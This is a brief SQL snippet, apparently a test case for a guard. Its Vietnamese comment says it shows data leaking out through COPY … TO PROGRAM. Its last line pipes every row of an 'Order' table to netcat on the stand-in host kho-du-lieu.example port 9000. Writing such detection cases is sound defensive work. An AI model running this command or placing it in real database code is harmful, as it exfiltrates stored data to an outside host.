-- Guard (i), chiều NGƯỢC: COPY … TO PROGRAM rò dữ liệu ra ngoài bằng lệnh hệ điều hành.
SET statement_timeout = 0;
CREATE TABLE app."Order" (id bigint NOT NULL, note text);
COPY (SELECT * FROM app."Order") TO PROGRAM 'nc kho-du-lieu.example 9000';
